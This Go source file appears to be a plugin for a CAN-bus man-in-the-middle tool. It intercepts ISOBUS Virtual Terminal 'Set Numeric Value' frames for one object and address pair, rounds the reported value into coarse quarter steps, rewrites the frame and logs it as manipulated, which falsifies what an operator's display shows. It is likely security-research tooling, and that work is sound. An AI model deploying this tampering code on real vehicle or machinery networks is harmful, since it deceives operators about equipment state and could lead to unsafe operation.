package fakeview59136

import (
	"encoding/binary"
	"time"

	"cant/can/flowroutines"
	"cant/util/globals"
)

func GetName() string {
	return "SetNumericValue Request Filter"
}

func SupportedPGNs() []uint32 {
	return []uint32{59136}
}

func UniqIdentifier() int {
	return 6
}

var count = 0
var last flowroutines.FlowData
var targetOID = uint16(318)
var srcAddr = 135
var dstAddr = 200
var maxCapacity = float64(6200)
var ValueChan = make(chan [3]byte, 1000)
var ValueChanActive = false

func Run(data flowroutines.FlowData) (flowroutines.FlowData, bool) {
	ValueChanActive = true
	content := data.CanFrame.Data()
	// check VT_FUNC = 0xA8 (Set Numeric value)
	if content[0] != 0xA8 {
		return data, true
	}
	// Check target Object ID
	if binary.LittleEndian.Uint16(content[1:3]) != targetOID {
		return data, true
	}
	// Check src and dst
	if data.CanFrame.ID()&uint32(0xFF) != uint32(srcAddr) || (data.CanFrame.ID()>>8)&uint32(0xFF) != uint32(dstAddr) {
		return data, true
	}
	currPercentage := float64(binary.LittleEndian.Uint16(content[4:6])) / maxCapacity
	replace := [3]byte{0x00, 0x00, 0x00}
	if currPercentage >= 0.125 && currPercentage < 0.375 {
		binary.LittleEndian.PutUint16(replace[0:2], uint16(0.25*maxCapacity))
	} else if currPercentage >= 0.375 && currPercentage < 0.625 {
		binary.LittleEndian.PutUint16(replace[0:2], uint16(0.5*maxCapacity))
	} else if currPercentage >= 0.625 && currPercentage < 0.875 {
		binary.LittleEndian.PutUint16(replace[0:2], uint16(0.75*maxCapacity))
	} else if currPercentage >= 0.875 {
		binary.LittleEndian.PutUint16(replace[0:2], uint16(maxCapacity))
	}
	// for testing purposes: set raw numeric value to 0x00 0x00 0x00
	for i := 0; i < len(replace); i++ {
		content[4+i] = replace[i]
	}
	ValueChan <- replace
	data.CanFrame = data.CanFrame.SetData(content)
	logdata := globals.Livelog.NewLogData()
	logdata.Identifier = "FakeView59136"
	logdata.Timestamp = time.Now().UnixNano()
	logdata.Msg = "Replaced Data in Set Numeric Value request"
	globals.Livelog.Send <- logdata
	globals.Statistics.AddManipulated <- uint64(1)
	return data, true // manipulated frame, continue?
}
